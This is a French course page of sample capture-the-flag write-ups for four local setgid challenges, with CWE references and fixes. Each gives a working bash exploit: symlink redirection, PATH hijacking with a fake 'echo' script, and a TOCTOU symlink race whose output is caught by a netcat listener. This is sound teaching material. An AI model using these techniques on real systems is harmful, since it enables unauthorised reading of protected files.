---
title: Exemples de writeups
---

# Exemples courts issues des laboratoires

## Assiette

### Contexte

Nous avons deux fichiers exécutables: un script python `assiette.py` qui et son programme de lancement en *sgid* `assiette`. Nous voyons également un répertoire plats pour lequel nous n'avons aucun droit. Les membres du groupe `assiette` peuvent par contre en lister le contenu.

Le programme `assiette.py` prend en entrée un nom de plat, vérifie qu'il ne contient pas de point et que ce n'est pas "`flag`", puis affiche le contenu du fichier qui porte ce nom, s'il existe dans le répertoire `plats`. 

### Faiblesses et vulnérabilités

Tout d'abord, le chemin vers le répertoire `plats` est un chemin relatif. Il est donc possible d'utiliser un autre répertoire plat que celui fourni avec le défi. Aussi, lors de l'ouverture du fichier, on suit implicitement les liens symboliques. Il est donc possible de contourner la contrainte qui nous empêche de demander le fichier `flag`.

### Exploitation

```bash
workdir="$(mktemp -d)"
cd "$workdir"
mkdir plats
chmod a+rx plats
ln -s /quetes/02-sys/01-assiette/plats/flag plats/fromage
echo fromage | /quetes/02-sys/01-assiette/assiette
```

### CWEs

- CWE-61: UNIX Symbolic Link Following

### Correction

1. Utiliser un chemin absolu pour résoudre le répertoire `plats`. Ce correctif est suffisant pour corriger la vulnérabilité.
2. Pour adresser la faiblesse du lien suivi, bien que le correctif précédent la rend impossible à exploiter, il faut passer l'option `NOFOLLOW` lors de l'ouverture du fichier. En python, le module `os` offre une fonction open qui accepte l'option, mais retourne un descripteur de fichier. Pour obtenir un objet fichier comme la fonction de haut-niveau `open`, on doit appeler `fdopen` du descripteur reçu d'`os.open`: `os.fdopen(os.open(filename, os.O_NOFOLLOW))`.

## Quoi encore?

### Contexte

Nous avons deux fichiers: un fichier binaire exécutable en sgid `quoi_encore` et un fichier `flag.txt`, vraisemblablement l'objectif que l'on doit réussir à lire.

### Faiblesses et vulnérabilités

En faisant une trace avec `strace` ou un `strings`, on voit que le programme lance éventuellement `/usr/bin/env echo XXXX`. Le programme `echo` est donc résolu par la recherche dans la variable d'environnement `PATH` contrôlée par l'utilisateur. Il est donc possible de modifier `PATH` afin de contrôler quel programme `echo` sera exécuté.

### Exploitation

```bash
workdir="$(mktemp -d)"
cd "$workdir"
echo -e '#!/bin/sh\ncat /quetes/02-sys/02-quoi_encore/flag.txt' > echo
chmod +x echo
PATH="$PWD:$PATH" /quetes/02-sys/02-quoi_encore/quoi_encore
```

### CWEs

- CWE-426: Untrusted Search Path

### Correction

Deux correctifs simples nous viennent à l'esprit. Soit nous n'utilisons pas la variable `PATH` pour faire la résolution et nous prenons plutôt le programme `echo` que nous choisissons et spécifiant un chemin absolu. Autrement, nous remplaçons la variable d'environnement `PATH` par une valeur que nous choisissons afin d'écraser celle spécifiée par l'utilisateur. 

## Insipide

### Contexte

Nous avons deux fichiers: un fichier binaire exécutable en sgid `insipide` et un fichier `flag.txt`, vraisemblablement l'objectif que l'on doit réussir à lire.

### Analyse

En lançant le programme, nous remarquons qu'il saisit une entrée mais il ne se passe rien de plus. Pour avoir plus de détails, on trace les appels de fonctions de librairies qu'il fait à l'aide de l'utilitaire `ltrace`. On voit alors que le programme compare l'entrée fournis à la chaîne "ouais c'est pas faux". Tentons de lui donner cette chaîne pour obtenir un résultat différent. 

Malheureusement, le programme ne fait pas beaucoup plus. Traçons le à nouveau, cette fois avec l'entrée qui fait réussir le `strncmp`. Nous remarquons alors que le programme tente d'ouvrir un fichier nommé `bon` dans le répertoire courant. Nous n'avons pas les droits d'écrire dans le répertoire où se trouve le programme mais comme le chemin est relatif, nous pouvons nous créer un répertoire de travail où nous aurons les droits d'écritures puis y placer un fichier avec le `bon` nom.

Même avec un fichier bon dans le répertoire courant, le programme n'affiche rien de plus. Retraçons... On voit alors qu'il lit du fichier puis compare le résultat à la chaîne `ca fait du bien de parler.`. Mettons cette chaîne dans le `bon` fichier et ressayons.

Toujours rien de plus d'évident. Une nouvelle trace nous montre que le programme tente alors d'ouvrir le fichier `flag.txt` qui contiendrait le flag que nous cherchons mais comme nous sommes dans un autre répertoire, ce fichier n'existe pas. Nous pourrions créer un fichier flag, mais si nous tentons en fait de lire le contenue du fichier qui appartient au défi, créer notre fichier ne nous avancera à rien. Par contre, si nous créons un lien symbolique dans le répertoire courant, qui se nomme `flag.txt` mais qui référence en fait le fichier `/quetes/02-sys/03-insipide/flag.txt`, le programme traversera peut-être le lien lors de l'ouverture du fichier.

C'est bien ce qui se produit et l'on obtient notre flag. 

### Exploitation

```bash
workdir="$(mktemp -d)"
cd "$workdir"
echo "ca fait du bien de parler." > bon
ln -s /quetes/02-sys/03-insipide/flag.txt
echo "ouais c'est pas faux" | /quetes/02-sys/03-insipide/insipide
```

### CWEs

- CWE-61: UNIX Symbolic Link Following
- CWE-798: Use of Hard-coded Credentials 

### Correction

Il est évident que ce défi est plutôt artificiel et vise à nous montrer la puissance des outils de traçage. Néanmoins, si nous regardons les faiblesses identifiées, il est tout de même possible de suggérer certains correctifs. On pourrait placer ces chaînes secrètes dans un fichier qui est lisible que par l'utilisateur `insipide`. De cette façon, lors du traçage, on ne pourrait pas les obtenir puisque l'ouverture de ce fichier échouerait lorsque tracé. Pour la lecture du fichier `flag.txt`, le programme traverse aveuglement les liens symboliques. On peut spécifier, lors du `open` l'option `O_NOFOLLOW` qui ferait échouer l'ouverture si le fichier est un lien symbolique.

## Pigeon

### Contexte

Il nous est donné trois fichiers. Un fichier `flag.txt` que nous devons vraisemblablement réussir à lire. Un programme setgid `pigeon` et son code source. Le programme tente de lire le fichier passé par argument et d'envoyer son contenu vers le socket spécifié en argument (hôte et port).

### Faiblesses et vulnérabilités

Le programme vérifie que l'utilisateur a le droit de lire le fichier (`access(..., R_OK)`). Si cette vérification réussie, le contenu est lu et écrit dans le socket. Il y a donc une condition de course (TOCTOU) puisque la vérification est faite avant l'ouverture du fichier. Nous pouvons donc tenter de faire changer le fichier entre les deux.

### Exploitation

Puisque nous fournissons seulement un chemin au programme mais nous souhaitons faire varier le fichier pendant son exécution, nous aurons recours à un lien symbolique. Nous ferons alterner la cible du lien entre un fichier lisible par tous et le fichier du flag, tout en gardant le même nom. 

```bash
workdir="$(mktemp -d)"
cd "$workdir"
chmod -R a+rx .

function get_free_port () {
    read lower upper < /proc/sys/net/ipv4/ip_local_port_range
    for (( port=lower ; port <= upper ; port++ )); do
            ss -lpn | grep -q ":$port " || break
    done
    echo $port
}

port=$(get_free_port)
end=$((SECONDS+5))  # Boucler 5s

timeout 5 nc -k -l "$port" | grep --line-buffered INF600C &
while [ "$SECONDS" -lt "$end" ]; do ln -sf /quetes/02-sys/04-pigeon/flag.txt lien; ln -sf /etc/hostname lien; done &
while [ "$SECONDS" -lt "$end" ]; do /quetes/02-sys/04-pigeon/pigeon "$PWD/lien" 127.0.0.1 "$port" > /dev/null; done &
```

### CWEs

- CWE-367: Time-of-check Time-of-use
- CWE-61: UNIX Symbolic Link Following

### Correction

1. Pour adresser le problème du TOCTOU, il faut éviter de vérifier l'accès au fichier avec un `access` avant de faire l'ouverture. Il faut plutôt abandonner les droits *setgid* puis faire l'ouverture du fichier en tant que l'utilisateur. Le système d'exploitation fera la vérification des droits pour nous. On peut alors gérer l'erreur si elle a lieu.
2. Pour adresser la faiblesse du lien suivi, il faut passer l'option `O_NOFOLLOW` lors de l'ouverture du fichier.

# Writeups d'Hunert Hackin'

Vous pouvez également jeter un coup d'oeil aux [writeups d'*Hubert Hackin*](https://huberthackin.gitlab.io/posts/). Ils ne sont pas écrits en fonction du cours mais ce sont néanmoins des writeups complets qui peuvent vous guider dans l'écriture des votres.

